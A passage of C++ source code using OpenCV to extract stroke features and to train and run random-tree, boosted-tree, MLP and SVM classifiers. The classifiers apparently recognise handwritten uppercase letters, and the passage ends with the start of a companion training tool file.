  Copyright (C)
  File name:      
  Author:				Hardy
  Version:				1.0
  Date:					2007－3－5
  Description:			模式识别部分,提取特征数据，训练模型，预测结果
  Others:         
  Function List:      
  History:        
    1. Date:
       Author:
       Modification:
    2. ...
************************************************/

#include "stdafx.h"
#include "MachineLearning.h"
#include <highgui.h>
#include <iostream>
#include <fstream>


MachineLearning::MachineLearning(void)
{
	is_load_training_model = false;
	traning_method = RandomTrees;
}

bool MachineLearning::getCrossFeature(IplImage *img,float pcaData[])
/*************************************************
  Function:        
  Description:  样本数据载入		
  Date:			2007－3－5
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{

	assert(img);

	////计算图形所在矩形
	//int cx,cy;
	//getCrossCenter(img,cx,cy);
	//CvRect roiRect;
	//getCrossSpecifyArea(img,roiRect);

	//assert(roiRect.x>0);
	//assert(roiRect.y>0);
	//assert(roiRect.height>0 && roiRect.height < img->width);
	//assert(roiRect.width>0 && roiRect.width < img->width );
	//cvSetImageROI(img,roiRect);


	//IplImage *img_copy = cvCreateImage(cvSize(100,100) , 8, 1 );
	//img_copy->origin = img->origin;
	//cvZero(img_copy);
	//cvResize(img,img_copy,CV_INTER_NN);
	//cvResetImageROI(img);


	//计算形心
	int cx,cy;
	getCrossCenter(img,cx,cy);

	assert(cx<img->width);
	assert(cx>0);
	assert(cy<img->height);
	assert(cy>0);

	int shift_x = img->width/2 - cx;
	int shift_y = img->height/2 - cy;


	IplImage *img_copy = cvCreateImage(cvGetSize(img) , 8, 1 );
	img_copy->origin = img->origin;
	cvZero(img_copy);

	//移动图形到中心
	for(int i = 0; i<img->width;i++)
	{
		for(int j = 0; j<img->height;j++)
		{
			CvScalar c = cvGetAt(img,j,i); 
			int v = (int)c.val[0];
			if(v==255)
			{
				int nj=j+shift_y;
				int ni=i+shift_x;
				if(nj<img->height && ni<img->width)
					if(nj>=0 && ni>=0)
						cvSet2D(img_copy,nj,ni,c);
			}
		}
	}

	//计算密度特征数据--------------
	//int featureData[CROSS_ROWS + CROSS_COLS];
	//memset(featureData,-1,sizeof(featureData));
	//getCrossFeatureData(img_copy,featureData,CROSS_COLS,CROSS_ROWS);
	////std::cout<<"--------------------------------------------"<<std::endl;
	////cvShowImage("WIN1",img_copy);
	////cvWaitKey(0);	
	//float CrossData[10];
	//ExtractPCA(CrossData,featureData,CROSS_COLS+CROSS_ROWS);
	//
	
	//计算距离特征数据	
	int featureDisData[2*CROSS_ROWS + CROSS_COLS];
	memset(featureDisData,-1,sizeof(featureDisData));	
	getDistanceFeatureData(img_copy,featureDisData,CROSS_COLS,CROSS_ROWS);
	float DistanceData[10];
	ExtractPCA(DistanceData,featureDisData,CROSS_COLS+2*CROSS_ROWS);

	//合并特征数据
	//for(int i=0;i<5;i++) pcaData[i] = CrossData[i];
	//for(int i=5;i<10;i++) pcaData[i] = DistanceData[i-5];
	for(int i=0;i<10;i++) pcaData[i] = DistanceData[i];

	
	cvReleaseImage(&img_copy);

	return true;
}

void MachineLearning::getCrossFeatureData(IplImage *img_cross,int featureData[],const int &cols,const int &rows)
/*************************************************
  Function:        
  Description:  穿线得到特征数据		
  Date:			2007－3－5
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
	const int CROSS_VALID_LENGTH = 6; //在6个象素内不计算穿越数目,避免噪音
	CvScalar c;

	for(int cross_index=0;cross_index<rows;cross_index++)
	{
		int y = (int)(img_cross->height*((float)cross_index/rows)); //按照比例决定位置

		int cross_count = 0;
		int pre_v = -1;
		int pre_x = 0;
		for(int x =0;x<img_cross->width;x++)
		{			 
			c = cvGetAt(img_cross,y,x); 
			int v = (int)c.val[0];
			if(pre_v==255 && v==0) 
				if((x-pre_x)>CROSS_VALID_LENGTH)
				{
					cross_count++;
					pre_x = x;
				}
			pre_v = v;
			
		}

		//cout<<cross_count<<",";		
		featureData[cross_index] = cross_count;
		
	}

	for(int cross_index=0;cross_index<cols;cross_index++)
	{
		int x = (int)(img_cross->width*((float)cross_index/cols));

		int cross_count = 0;
		int pre_v = -1;
		int pre_y = 0;
		for(int y =0;y<img_cross->height;y++)
		{
			
			c = cvGetAt(img_cross,y,x); 
			int v = (int)c.val[0];
			if(pre_v==255 && v==0)
				if((y-pre_y)>CROSS_VALID_LENGTH)
				{
					cross_count++;
					pre_y = y;
				}

			pre_v = v;
		}

		//cout<<cross_count<<",";		
		featureData[rows+cross_index] = cross_count;		
	} 


}

void MachineLearning::getDistanceFeatureData(IplImage *img_cross,int featureData[],const int &cols,const int &rows)
/*************************************************
  Function:        
  Description:  穿线得到距离特征数据		
  Date:			2007－3－9
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{	

	CvScalar c;

	//从左向右穿线
	for(int cross_index=0;cross_index<rows;cross_index++)
	{
		int y = (int)(img_cross->height*((float)cross_index/rows)); //按照比例决定位置
		int meet_x = 0;
		for(int x =0;x<img_cross->width;x++)
		{			 
			c = cvGetAt(img_cross,y,x); 
			int v = (int)c.val[0];
			if(v==255) 
			{
				meet_x = x;			
				break;
			}
		}
		//cout<<meet_x<<",";		
		featureData[cross_index] = meet_x;		
	}

	//从右向左穿线
	for(int cross_index=rows;cross_index<2*rows;cross_index++)
	{
		int y = (int)(img_cross->height*((float)(cross_index-rows)/rows)); //按照比例决定位置
		int meet_x = 0;
		for(int x =(img_cross->width-1);x>-1;x--)
		{			 
			c = cvGetAt(img_cross,y,x); 
			int v = (int)c.val[0];
			if(v==255) 
			{
				meet_x = x;			
				break;
			}			
		}
		//cout<<meet_x<<",";
		featureData[cross_index] = meet_x;		
	}

	//从下向上穿线
	for(int cross_index=0;cross_index<cols;cross_index++)
	{
		int x = (int)(img_cross->width*((float)cross_index/cols));

		int meet_y = 0;
		for(int y =(img_cross->height-1);y>-1;y--)
		{
			
			c = cvGetAt(img_cross,y,x); 
			int v = (int)c.val[0];
			if(v==255) 
			{
				meet_y = y;
				break;
			}
		}
		//cout<<meet_y<<",";		
		featureData[2*rows+cross_index] = meet_y;		
	} 


}

void MachineLearning::getCrossSpecifyArea(IplImage *img,CvRect &specifie_rect)
/*************************************************
  Function:        
  Description:  获得图像矩形		
  Date:			2007－3－7
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
	CvRect res_rect = cvRect(0,0,0,0);
	const int fix =0;
	CvMemStorage*  mt_storage  =  cvCreateMemStorage(0);
	CvSeq* mt_contour = NULL;
	int ApproxCount = 2; //轮廓优化等级	
	IplImage *frame_copy = cvCreateImage(cvGetSize(img) , 8, 1 );
	frame_copy->origin = img->origin;
	cvCopy(img,frame_copy,0);
	cvFindContours( frame_copy, mt_storage, &mt_contour, sizeof(CvContour),
		CV_RETR_EXTERNAL, CV_CHAIN_APPROX_SIMPLE, cvPoint(0,0) );
	if(mt_contour)
	{
		CvSeqReader reader;
		int i;
		CvPoint left_top_pt=cvPoint(img->width,img->height);
		CvPoint right_bottom_pt=cvPoint(0,0);
		
		CvPoint pt;
		CvSeq *contour2 = mt_contour;

		for (; contour2 != NULL; contour2 = contour2->h_next)
		{
			cvStartReadSeq(contour2, &reader);
			int N = contour2->total;
			if(N<10) continue;

			for (i = 0; i < N; i++)
			{
				CV_READ_SEQ_ELEM(pt, reader);
				if(left_top_pt.x>pt.x)left_top_pt.x = pt.x;
				if(left_top_pt.y>pt.y)left_top_pt.y = pt.y;
				if(right_bottom_pt.x<pt.x)right_bottom_pt.x = pt.x;
				if(right_bottom_pt.y<pt.y)right_bottom_pt.y = pt.y;

			}
			res_rect = cvRect(abs(left_top_pt.x-fix),abs(left_top_pt.y-fix),(right_bottom_pt.x-left_top_pt.x+2*fix),(right_bottom_pt.y-left_top_pt.y+2*fix));
			specifie_rect = res_rect;
			break;
		}
	}

	cvClearMemStorage(mt_storage);
	cvReleaseImage(&frame_copy);
}

void MachineLearning::getCrossCenter(IplImage *img,int &cx,int &cy)
/*************************************************
  Function:        
  Description:  获得图像平移到中心		
  Date:			2007－3－5
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
	CvMemStorage*  mt_storage  =  cvCreateMemStorage(0);
	CvSeq* mt_contour = NULL;
	int ApproxCount = 2; //轮廓优化等级	
	IplImage *frame_copy = cvCreateImage(cvGetSize(img) , 8, 1 );
	frame_copy->origin = img->origin;
	cvCopy(img,frame_copy,0);
	cvFindContours( frame_copy, mt_storage, &mt_contour, sizeof(CvContour),
		CV_RETR_EXTERNAL, CV_CHAIN_APPROX_SIMPLE, cvPoint(0,0) );
	if(mt_contour)
	{
		CvSeqReader reader;
		int i;
		int total_x = 0;
		int total_y = 0;
		
		CvPoint pt;
		CvSeq *contour2 = mt_contour;

		for (; contour2 != NULL; contour2 = contour2->h_next)
		{
			cvStartReadSeq(contour2, &reader);
			int N = contour2->total;
			if(N<10) continue;

			for (i = 0; i < N; i++)
			{
				CV_READ_SEQ_ELEM(pt, reader);
				total_x += pt.x;
				total_y += pt.y;
			}
			cx = total_x/N;
			cy = total_y/N;
			break;
		}
	}
	cvReleaseMemStorage(&mt_storage);
	cvReleaseImage(&frame_copy);
}

void MachineLearning::ExtractPCA(float pcadata[],const int featureData[],const int &dataWidth )
/*************************************************
  Function:        
  Description:  采用fourier transfer 得到降维的数据		
  Date:			2007－3－5
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
			
	//int dataWidth = cols + rows;		
	//CvMat* pData = cvCreateMat(2,dataWidth, CV_32FC1);
	//for(int i = 0; i < dataWidth; i++)
	//{
	//	cvSet2D(pData, 0, i,cvRealScalar(i));				
	//	cvSet2D(pData, 1, i,cvRealScalar(featureData[i]));				
	//}

	//CvMat* pMean = cvCreateMat(2, dataWidth, CV_32FC1);
	//CvMat* pEigVals = cvCreateMat(2, dataWidth, CV_32FC1);
	//CvMat* pEigVecs = cvCreateMat(2, dataWidth, CV_32FC1);

	//cvCalcPCA(pData, pMean, pEigVals, pEigVecs, CV_PCA_DATA_AS_ROW );

	//float pp[100];
	//memcpy(pp,pEigVals->data.fl,100 );
	//memcpy(pp,pEigVecs->data.fl,100 );
	//memcpy(pp,pMean->data.fl,100 );
	
	CvMat* s = cvCreateMat(1,dataWidth,CV_32FC1);
	memcpy(s->data.i,featureData,sizeof(featureData));
	for(int i=0;i<dataWidth;i++)
			cvSetReal2D(s,0,i,featureData[i]);
 
	//for(int i=0;i<dataWidth;i++)
	//		printf("%6.2f\t",cvGetReal2D(s,0,i));
	//printf("\n");

	CvMat* d = cvCreateMat(1,dataWidth,CV_32FC1);

	cvDFT(s,d,CV_DXT_FORWARD|CV_DXT_SCALE);

	//for(int i=0;i<dataWidth;i++)
	//		printf("%6.2f\t",cvGetReal2D(d,0,i));
	//printf("\n");

	for(int i=0;i<10;i++)
	{
		pcadata[i] = (float)cvGetReal2D(d,0,i); 
	}

	cvReleaseMat(&s);
	cvReleaseMat(&d);
}



void MachineLearning::ExtractDFT(float pcadata[],const int featureData[],const int &dataWidth,const int &DFTwidth )
/*************************************************
  Function:        
  Description:  采用fourier transfer 得到降维的数据		
  Date:			2007－3－5
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
			

	
	CvMat* s = cvCreateMat(1,dataWidth,CV_32FC1);
	memcpy(s->data.i,featureData,sizeof(featureData));
	for(int i=0;i<dataWidth;i++)
			cvSetReal2D(s,0,i,featureData[i]);
 
	//for(int i=0;i<dataWidth;i++)
	//		printf("%6.2f\t",cvGetReal2D(s,0,i));
	//printf("\n");

	CvMat* d = cvCreateMat(1,dataWidth,CV_32FC1);

	cvDFT(s,d,CV_DXT_FORWARD|CV_DXT_SCALE);

	//for(int i=0;i<dataWidth;i++)
	//		printf("%6.2f\t",cvGetReal2D(d,0,i));
	//printf("\n");

	for(int i=0;i<DFTwidth;i++)
	{
		pcadata[i] = (float)cvGetReal2D(d,0,i); 
	}

	cvReleaseMat(&s);
	cvReleaseMat(&d);
}



int MachineLearning::read_num_class_data( const char* filename, int var_count,CvMat** data, CvMat** responses )
{
    const int M = 1024;
    FILE* f = fopen( filename, "rt" );
    CvMemStorage* storage;
    CvSeq* seq;
    char buf[M+2];
    float* el_ptr;
    CvSeqReader reader;
    int i, j;

    if( !f )
        return 0;

    el_ptr = new float[var_count+1];
    storage = cvCreateMemStorage();
    seq = cvCreateSeq( 0, sizeof(*seq), (var_count+1)*sizeof(float), storage );

    for(;;)
    {
        char* ptr;
        if( !fgets( buf, M, f ) || !strchr( buf, ',' ) )
            break;
        el_ptr[0] = buf[0];
        ptr = buf+2;
        for( i = 1; i <= var_count; i++ )
        {
            int n = 0;
            sscanf( ptr, "%f%n", el_ptr + i, &n );
            ptr += n + 1;
        }
        if( i <= var_count )
            break;
        cvSeqPush( seq, el_ptr );
    }
    fclose(f);

    *data = cvCreateMat( seq->total, var_count, CV_32F );
    *responses = cvCreateMat( seq->total, 1, CV_32F );

    cvStartReadSeq( seq, &reader );

    for( i = 0; i < seq->total; i++ )
    {
        const float* sdata = (float*)reader.ptr + 1;
        float* ddata = data[0]->data.fl + var_count*i;
        float* dr = responses[0]->data.fl + i;

        for( j = 0; j < var_count; j++ )
            ddata[j] = sdata[j];
        *dr = sdata[-1];
        CV_NEXT_SEQ_ELEM( seq->elem_size, reader );
    }

    cvReleaseMemStorage( &storage );
    delete el_ptr;
    return 1;
}

int MachineLearning::build_rtrees_classifier(const char* data_filename,
  const char* filename_to_save, const char* filename_to_load )
{
    CvMat* data = 0;
    CvMat* responses = 0;
    CvMat* var_type = 0;
    CvMat* sample_idx = 0;

	


    // Create or load Random Trees classifier
    if( filename_to_load )
    {
        // load classifier from the specified file
        forest.load( filename_to_load );
        if( forest.get_tree_count() == 0 )
        {
            printf( "Could not read the classifier %s\n", filename_to_load );
            return -1;
        }
        printf( "The classifier %s is loaded.\n", data_filename );
    }
    else
    {
		int ok = read_num_class_data( data_filename, DataCount, &data, &responses );
		int nsamples_all = 0, ntrain_samples = 0;
		int i = 0;
		double train_hr = 0, test_hr = 0;
		
		CvMat* var_importance = 0;

		if( !ok )
		{
			printf( "Could not read the database %s\n", data_filename );
			return -1;
		}

		printf( "The database %s is loaded.\n", data_filename );
		nsamples_all = data->rows;
		ntrain_samples = (int)(nsamples_all*0.8);

		int ntrain_tests = -1;

		// create classifier by using <data> and <responses>
        printf( "Training the classifier ...");

        // 1. create type mask
        var_type = cvCreateMat( data->cols + 1, 1, CV_8U );
        cvSet( var_type, cvScalarAll(CV_VAR_ORDERED) );
        cvSetReal1D( var_type, data->cols, CV_VAR_CATEGORICAL );
		//00000000001

		// 2. create sample_idx
		sample_idx = cvCreateMat( 1, nsamples_all, CV_8UC1 );
		{
			CvMat mat;
			cvGetCols( sample_idx, &mat, 0, nsamples_all );
			cvSet( &mat, cvRealScalar(1) );

			for(int i=0;i<nsamples_all;i++)
			{
				if((i%5)==0) 
				{
					cvSet2D(sample_idx,0,i,cvRealScalar(0));
					ntrain_tests++;
				}
			}
		}
		
	
		// 3. train classifier
		forest.train( data, CV_ROW_SAMPLE, responses, 0, sample_idx, var_type, 0,
			CvRTParams(10,10,0,false,15,0,true,4,100,0.01f,CV_TERMCRIT_ITER));
		printf( "\n");

		// compute prediction error on train and test data
		int test_count=0;
		int train_count=0;
		for(int i = 0; i < nsamples_all; i++ )
		{
			double r;
			CvMat sample;
			cvGetRow( data, &sample, i );

			r = forest.predict( &sample );
			double abs_r = fabs((float)r - responses->data.fl[i]) <= FLT_EPSILON ? 1.0 : 0.0;

			if(abs_r < FLT_EPSILON)
			{
				printf( "data error with lines %d '%c' %f \n",i,(char)responses->data.fl[i],fabs((float)r - responses->data.fl[i])); 
			}

			if((i%5)==0)
			{
				test_hr += abs_r;	
			}
			else
			{
				train_hr += abs_r; 
			}
				
		}

		test_hr /= (double)(ntrain_tests);
		train_hr /= (double)(nsamples_all-ntrain_tests);
		printf( "Recognition rate: train = %.1f%%, test = %.1f%%\n",
			train_hr*100., test_hr*100. );

		//printf( "Number of trees: %d\n", forest.get_tree_count() );
	}






    //// Save Random Trees classifier to file if needed
    if( filename_to_save )
        forest.save( filename_to_save );
	//forest.save("..//data//rTreeResult.xml");

    cvReleaseMat( &sample_idx );
    cvReleaseMat( &var_type );
    cvReleaseMat( &data );
    cvReleaseMat( &responses );

    return 0;
}


int MachineLearning::build_boost_classifier( char* data_filename,
    char* filename_to_save, char* filename_to_load )
{
    const int class_count = 3;
    CvMat* data = 0;
    CvMat* responses = 0;
    CvMat* var_type = 0;
    CvMat* temp_sample = 0;
    CvMat* weak_responses = 0;

    int ok = read_num_class_data( data_filename, 13, &data, &responses );
    int nsamples_all = 0, ntrain_samples = 0;
    int var_count;
    int i, j, k;
    double train_hr = 0, test_hr = 0;
    CvBoost boost;

    if( !ok )
    {
        printf( "Could not read the database %s\n", data_filename );
        return -1;
    }

    printf( "The database %s is loaded.\n", data_filename );
    nsamples_all = data->rows;
    ntrain_samples = (int)(nsamples_all*0.9);
    var_count = data->cols;

    // Create or load Boosted Tree classifier
    if( filename_to_load )
    {
        // load classifier from the specified file
        boost.load( filename_to_load );
        ntrain_samples = 0;
        if( !boost.get_weak_predictors() )
        {
            printf( "Could not read the classifier %s\n", filename_to_load );
            return -1;
        }
        printf( "The classifier %s is loaded.\n", data_filename );
    }
    else
    {
        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        //
        // As currently boosted tree classifier in MLL can only be trained
        // for 2-class problems, we transform the training database by
        // "unrolling" each training sample as many times as the number of
        // classes (26) that we have.
        //
        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        CvMat* new_data = cvCreateMat( ntrain_samples*class_count, var_count + 1, CV_32F );
        CvMat* new_responses = cvCreateMat( ntrain_samples*class_count, 1, CV_32S );

        // 1. unroll the database type mask
        printf( "Unrolling the database...\n");
        for( i = 0; i < ntrain_samples; i++ )
        {
            float* data_row = (float*)(data->data.ptr + data->step*i);
            for( j = 0; j < class_count; j++ )
            {
                float* new_data_row = (float*)(new_data->data.ptr +
                                new_data->step*(i*class_count+j));
                for( k = 0; k < var_count; k++ )
                    new_data_row[k] = data_row[k];
                new_data_row[var_count] = (float)j;
                new_responses->data.i[i*class_count + j] = responses->data.fl[i] == j+'A';
            }
        }

        // 2. create type mask
        var_type = cvCreateMat( var_count + 2, 1, CV_8U );
        cvSet( var_type, cvScalarAll(CV_VAR_ORDERED) );
        // the last indicator variable, as well
        // as the new (binary) response are categorical
        cvSetReal1D( var_type, var_count, CV_VAR_CATEGORICAL );
        cvSetReal1D( var_type, var_count+1, CV_VAR_CATEGORICAL );



        // 3. train classifier
        printf( "Training the classifier (may take a few minutes)...");
        boost.train( new_data, CV_ROW_SAMPLE, new_responses, 0, 0, var_type, 0,
            CvBoostParams(CvBoost::REAL, 100, 0.95, 5, false, 0 ));
        cvReleaseMat( &new_data );
        cvReleaseMat( &new_responses );
        printf("\n");
    }

    temp_sample = cvCreateMat( 1, var_count + 1, CV_32F );
    weak_responses = cvCreateMat( 1, boost.get_weak_predictors()->total, CV_32F ); 

    // compute prediction error on train and test data
    for( i = 0; i < nsamples_all; i++ )
    {
        int best_class = 0;
        double max_sum = -DBL_MAX;
        double r;
        CvMat sample;
        cvGetRow( data, &sample, i );
        for( k = 0; k < var_count; k++ )
            temp_sample->data.fl[k] = sample.data.fl[k];

        for( j = 0; j < class_count; j++ )
        {
            temp_sample->data.fl[var_count] = (float)j;
            boost.predict( temp_sample, 0, weak_responses );
            double sum = cvSum( weak_responses ).val[0];
            if( max_sum < sum )
            {
                max_sum = sum;
                best_class = j + 'A';
            }
        }

        r = fabs(best_class - responses->data.fl[i]) < FLT_EPSILON ? 1 : 0;

        if( i < ntrain_samples )
            train_hr += r;
        else
            test_hr += r;
    }

    test_hr /= (double)(nsamples_all-ntrain_samples);
    train_hr /= (double)ntrain_samples;
    printf( "Recognition rate: train = %.1f%%, test = %.1f%%\n",
            train_hr*100., test_hr*100. );

    printf( "Number of trees: %d\n", boost.get_weak_predictors()->total );

    // Save classifier to file if needed
    if( filename_to_save )
        boost.save( filename_to_save );

    cvReleaseMat( &temp_sample );
    cvReleaseMat( &weak_responses );
    cvReleaseMat( &var_type );
    cvReleaseMat( &data );
    cvReleaseMat( &responses );

    return 0;
}


int MachineLearning::build_mlp_classifier( char* data_filename,
    char* filename_to_save, char* filename_to_load )
{
    const int class_count = 3;
    CvMat* data = 0;
    CvMat train_data;
    CvMat* responses = 0;
    CvMat* mlp_response = 0;

    int ok = read_num_class_data( data_filename, 13, &data, &responses );
    int nsamples_all = 0, ntrain_samples = 0;
    int i, j;
    double train_hr = 0, test_hr = 0;
    CvANN_MLP mlp;

    if( !ok )
    {
        printf( "Could not read the database %s\n", data_filename );
        return -1;
    }

    printf( "The database %s is loaded.\n", data_filename );
    nsamples_all = data->rows;
    ntrain_samples = (int)(nsamples_all*0.9);

    // Create or load MLP classifier
    if( filename_to_load )
    {
        // load classifier from the specified file
        mlp.load( filename_to_load );
        ntrain_samples = 0;
        if( !mlp.get_layer_count() )
        {
            printf( "Could not read the classifier %s\n", filename_to_load );
            return -1;
        }
        printf( "The classifier %s is loaded.\n", data_filename );
    }
    else
    {
        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        //
        // MLP does not support categorical variables by explicitly.
        // So, instead of the output class label, we will use
        // a binary vector of <class_count> components for training and,
        // therefore, MLP will give us a vector of "probabilities" at the
        // prediction stage
        //
        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        CvMat* new_responses = cvCreateMat( ntrain_samples, class_count, CV_32F );

        // 1. unroll the responses
        printf( "Unrolling the responses...\n");
        for( i = 0; i < ntrain_samples; i++ )
        {
            int cls_label = cvRound(responses->data.fl[i]) - 'A';
            float* bit_vec = (float*)(new_responses->data.ptr + i*new_responses->step);
            for( j = 0; j < class_count; j++ )
                bit_vec[j] = 0.f;
            bit_vec[cls_label] = 1.f;
        }
        cvGetRows( data, &train_data, 0, ntrain_samples );

        // 2. train classifier
        int layer_sz[] = { data->cols, 100, 100, class_count };
        CvMat layer_sizes =
            cvMat( 1, (int)(sizeof(layer_sz)/sizeof(layer_sz[0])), CV_32S, layer_sz );
        mlp.create( &layer_sizes );
        printf( "Training the classifier (may take a few minutes)...");
        mlp.train( &train_data, new_responses, 0, 0,
            CvANN_MLP_TrainParams(cvTermCriteria(CV_TERMCRIT_ITER,300,0.01),
            CvANN_MLP_TrainParams::RPROP,0.01));
        cvReleaseMat( &new_responses );
        printf("\n");
    }

    mlp_response = cvCreateMat( 1, class_count, CV_32F );

    // compute prediction error on train and test data
    for( i = 0; i < nsamples_all; i++ )
    {
        int best_class;
        CvMat sample;
        cvGetRow( data, &sample, i );
        CvPoint max_loc = {0,0};
        mlp.predict( &sample, mlp_response );
        cvMinMaxLoc( mlp_response, 0, 0, 0, &max_loc, 0 );
        best_class = max_loc.x + 'A';

        int r = fabs((double)best_class - responses->data.fl[i]) < FLT_EPSILON ? 1 : 0;

        if( i < ntrain_samples )
            train_hr += r;
        else
            test_hr += r;
    }

    test_hr /= (double)(nsamples_all-ntrain_samples);
    train_hr /= (double)ntrain_samples;
    printf( "Recognition rate: train = %.1f%%, test = %.1f%%\n",
            train_hr*100., test_hr*100. );

    // Save classifier to file if needed
    if( filename_to_save )
        mlp.save( filename_to_save );

    cvReleaseMat( &mlp_response );
    cvReleaseMat( &data );
    cvReleaseMat( &responses );

    return 0;
}

int MachineLearning::build_svm_classifier( char* data_filename,
    char* filename_to_save, char* filename_to_load )
{

    CvMat* data = 0;
    //CvMat train_data;
    CvMat* responses = 0;
    CvMat* mlp_response = 0;
	CvMat* var_type = 0;
    CvMat* sample_idx = 0;

    int ok = read_num_class_data( data_filename, 10, &data, &responses );

	float kk[100];
	memcpy(kk,data->data.fl,100);
    int nsamples_all = 0, ntrain_samples = 0;
    int i;
    double train_hr = 0, test_hr = 0;
    CvSVM svm;	

    if( !ok )
    {
        printf( "Could not read the database %s\n", data_filename );
        return -1;
    }

    printf( "The database %s is loaded.\n", data_filename );
    nsamples_all = data->rows;
    ntrain_samples = (int)(nsamples_all*0.9);


    // Create or load svm classifier
    if( filename_to_load )
    {
        // load classifier from the specified file
        svm.load( filename_to_load );
        ntrain_samples = 0;
		
        if( !svm.get_support_vector_count() )
        {
            printf( "Could not read the classifier %s\n", filename_to_load );
            return -1;
        }
        printf( "The classifier %s is loaded.\n", filename_to_load );
    }
    else
    {
         printf( "The classifier is in tranning...\n" );
		// 1. create type mask
		 
        var_type = cvCreateMat( data->cols, 1, CV_8U );
        cvSet( var_type, cvScalarAll(CV_VAR_CATEGORICAL) );
		//1111111111

        // 2. create sample_idx
        sample_idx = cvCreateMat( 1, nsamples_all, CV_8UC1 );
        {
            CvMat mat;
            cvGetCols( sample_idx, &mat, 0, ntrain_samples );
            cvSet( &mat, cvRealScalar(1) );

            cvGetCols( sample_idx, &mat, ntrain_samples, nsamples_all );
            cvSetZero( &mat );
        }
		//1111111000


        // 3. train classifier
        svm.train( data,responses,var_type,sample_idx,
			CvSVMParams( CvSVM::C_SVC, CvSVM::RBF ,0,0.3,0,0.1, 0, 0,
                 0, cvTermCriteria(CV_TERMCRIT_ITER,300,0.01) ));
        printf( "\n");
    }

    // compute prediction error on train and test data
    for( i = 0; i < nsamples_all; i++ )
    {
        double r;
        CvMat sample;
        cvGetRow( data, &sample, i );

        r = svm.predict( &sample );
        r = fabs((double)r - responses->data.fl[i]) <= FLT_EPSILON ? 1 : 0;

        if( i < ntrain_samples )
            train_hr += r;
        else
            test_hr += r;
    }

    test_hr /= (double)(nsamples_all-ntrain_samples);
    train_hr /= (double)ntrain_samples;
    printf( "Recognition rate: train = %.1f%%, test = %.1f%%\n",
            train_hr*100., test_hr*100. );

    printf( "Number of support_vector_count: %d\n", svm.get_support_vector_count() );

	//printf( "value of svm.get_support_vector(0): %f\n", svm.get_support_vector(0) );


    // Save classifier to file if needed
    //if( filename_to_save )
        //svm.save( filename_to_save );
	svm.save("../data/svmResult.xml");

    cvReleaseMat( &mlp_response );
    cvReleaseMat( &data );
    cvReleaseMat( &responses );

    return 0;
}



bool MachineLearning::load(const  char *training_filename)
/*************************************************
  Function:        
  Description:  训练数据载入		
  Date:			2007－3－6
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
	switch( traning_method )
	{
	case RandomTrees:
		forest.clear();
		build_rtrees_classifier(NULL,NULL,training_filename);
		break;
	default:
		;
	}
	is_load_training_model = true;

	return true;
}
bool MachineLearning::train(const  char *data_filename,const  char *save_filename)
/*************************************************
  Function:        
  Description:  样本数据训练		
  Date:			2007－3－6
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
	switch( traning_method )
	{
	case RandomTrees:
		forest.clear();
		build_rtrees_classifier(data_filename,save_filename,NULL);
		break;
	default:
		;
	}
	is_load_training_model = true;
	return true;
}
bool MachineLearning::predict(char &shape_type,float featureData[])
/*************************************************
  Function:        
  Description:  样本数据预测		
  Date:			2007－3－6
  Author:   
  Input:                         
  Output:         
  Return:         
  Others:          
*************************************************/
{
	if(is_load_training_model)
	{
		//float featureData[10];
		//getCrossFeature(img,featureData);
		
		//to do build sample
		CvMat *sample_data= cvCreateMat( 1, DataCount, CV_32F );
		//cvSet2D(sample_data,0,0,cvRealScalar(0));
		for(int i=0;i<DataCount;i++)
		{
			cvSet2D(sample_data,0,i,cvRealScalar(featureData[i]));
		}
		//float ss[23];
		//memcpy(ss,sample_data->data.fl,sizeof(float)*23); 

		switch( traning_method )
		{
		case RandomTrees:
			predict_rtrees_classifier(sample_data,shape_type);
			break;
		default:
			;
		}
		cvReleaseMat(&sample_data);

		return true;
	}
	else
		 return false;
}

int MachineLearning::predict_rtrees_classifier(CvMat *sample_data,char &shape_type)
{
	double r = forest.predict( sample_data );
	shape_type = (char)r;
	return 0;
}

 
 
 
trainingtools.cpp
// TrainingTools.cpp : 定义控制台应用程序的入口点。
//

//   26个字母要按一定笔划顺序书写。书写的规律有以下几点：  
//联机大写字母书写规则
//1. C J L O S U V W Z  一笔划完成 
//2. B D G K M N P Q T X Y   两笔划完成 
//3. A E F H I R      三笔划完成 

//online upper letter rule
//1. C J L O S U V W Z        finish in one stroke
//2. B D G K M N P Q T X Y    finish in two stroke
//3. A E F H I R              finish in three stroke


#include "stdafx.h"
#include "windows.h"
#include <iostream>
#include <string.h>
#include <cxcore.h>
#include <cv.h>
#include <highgui.h>
#include <fstream>
#include "Finger.h"
#include "MachineLearning.h"

#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")
#pragma comment(lib,"opencv_ml2410d.lib")
#pragma comment(lib,"opencv_imgproc2410.lib")

IplImage *image = 0 ; //原始图像
IplImage *image2 = 0 ; //原始图像

using namespace std;

const int SCALE_MAX = 500;
const DWORD IDLE_TIME_SPAN = 1000; //间隔一秒内没有输入，开始写入数据
const int SAMPLE_COUNT = 50; //每条曲线 五十个特征点
const int SAMPLE_COUNT_OPT = 5; //每条曲线只取五维
DWORD start_time =0;
DWORD idle_time =0;
bool InRecongnize = true;  //0 训练   1 预测
char pre_letter =0;
MachineLearning ml;

std::vector< FingerTrack > FingerTrackList;
std::vector <Finger>::iterator Itr_Finger;
std::vector< FingerTrack >::iterator Itr_FingerTrack;
std::vector< FingerTrack > FingerTrackListOpt;//优化轮廓

bool inTrack =false;
void WriteData(float featureData[]);
int DFT();
void toNormalSize();
int traing_data =0;
char letter='A';

